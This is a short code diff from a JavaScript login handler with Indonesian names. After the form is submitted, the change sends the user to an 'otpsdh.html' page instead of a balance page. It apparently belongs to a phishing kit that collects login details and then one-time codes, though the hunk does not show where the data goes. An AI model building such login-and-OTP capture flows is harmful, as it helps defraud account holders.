@@ -38,7 +38,7 @@ function sendLogin(){
       data: $('#sudah').serialize(),    
     complete: function(){    
     setTimeout(function(){   
-    window.location = "saldosdh.html";
+    window.location = "otpsdh.html";
     $("#lonte").hide();
     $('.load').fadeOut();
     document.getElementById('lanjutkan').innerHTML = "Lanjutkan"; 
